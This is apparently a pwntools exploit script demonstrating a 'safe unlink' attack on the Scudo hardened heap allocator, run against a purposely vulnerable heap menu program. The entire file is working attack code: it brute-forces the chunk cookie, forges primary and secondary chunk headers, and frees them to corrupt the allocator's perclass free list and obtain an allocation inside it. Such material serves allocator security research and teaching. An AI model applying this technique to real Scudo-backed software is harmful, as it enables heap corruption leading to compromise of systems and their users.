#!/usr/bin/python3
from pwn import *
from utils import *
from scudocookie import bruteforce, calc_checksum

elf = context.binary = ELF("malloc-menu-linux/malloc-menu-linux")

gs = '''
source ../gdb-plugin/scudo-69d4e5ae7b97.py
b *0x4017ac
'''

SCUDO_LIB = os.path.realpath("malloc-menu-linux/libscudo-linux.so") 
LIBS = os.path.realpath("malloc-menu-linux/libs")
LD = os.path.join(LIBS, "ld-linux-x86-64.so.2")
env = {"LD_PRELOAD": SCUDO_LIB, "LD_LIBRARY_PATH": LIBS}

if args.NOSCUDO:
    env = {}
elif args.QUARANTINE:
    env["SCUDO_OPTIONS"] = ":".join([
        "thread_local_quarantine_size_kb=5",
        "quarantine_size_kb=10",
        "quarantine_max_chunk_size=2048",
        "release_to_os_interval_ms=-1"
    ])

    
def start():
    return process([LD, elf.path], env=env, stdin=PTY)
   
io = start()
if args["GDB"]:
    gdb.attach(io,gdbscript=gs)

info("this script demonstrates the safe unlink technique, exploiting a simple heap menu program (malloc-menu-linux)")

ind, victim_chunk = malloc(io, 24, b"X"*24)
info(f"we allocate our victim chunk at {hex(victim_chunk)}")

info("assuming we have a way to read the cookie, we compute it here")
cookie = bruteforce_cookie(io, victim_chunk)
info(f"bruteforced cookie: {hex(cookie)}")


new_header = 0x8100
new_header = create_header(0, 8, 1)
forged_header = forge_header(victim_chunk, cookie, new_header)
largechunk_start = victim_chunk-0x40

info("in the first step we forge a fake primary chunk and free it into the perclass free list")
info(f"the header of our first fake chunk is located at {hex(largechunk_start)}")

exploit_perclass_header = create_header(20, 18, 1)
write(io, largechunk_start, forge_header(largechunk_start+0x10, cookie, exploit_perclass_header))
info(f"fake primary chunk at {hex(largechunk_start)}")
free(io, largechunk_start+0x10)
info(f"now the address {hex(largechunk_start)} is stored in the freelist")

info("for the second step we repeat the same step again")
write(io, largechunk_start, forge_header(largechunk_start+0x10, cookie, exploit_perclass_header))
info(f"fake primary chunk at {hex(largechunk_start)}")
free(io, largechunk_start+0x10)
info(f"now the addres {hex(largechunk_start)} is stored in the freelist")

info("assuming a leak we obtain the perclass address and from that compute where the pointers of our previously freed chunks are stored")
perclass_add = get_perclass_base(io, SCUDO_LIB, 20)
warn(f'perclass base: 0x{perclass_add:x}')

info(f"now we forge a fake secondary chunk header")
write(io, largechunk_start, p64(perclass_add+0x10)) #prev 
write(io, largechunk_start+0x8, p64(perclass_add+0x10)) #next
write(io, largechunk_start+0x10, p64(0xdeadbeef)) # CommitBase
write(io, largechunk_start+0x18, p64(0x30000)) # CommitSize
write(io, largechunk_start+0x20, p64(0xdeadbeef)) # MapBase
write(io, largechunk_start+0x28, p64(0x30000)) #MapSize
write(io, largechunk_start+0x30, forged_header) # Forge Header

info(f"now we free the fake secondary chunk triggering the unlinking and placing the address to the perclass structure into the perclass free list itself")
free(io, victim_chunk)

warn("now we allocate from the free list and obtain a chunk inside the perclass free list")
perclass_chunk = malloc(io, 2000)[1]
warn(f"perclass chunk {hex(perclass_chunk)}")

info("in gdb use: scudo perclass 1 20 to inspect the clobbered free list")
# Note that this leaves the free list in a messed up state, to exploit this bigger chunks are needed to allocate a chunk overlapping the next ClassIds perclass free list

io.interactive()
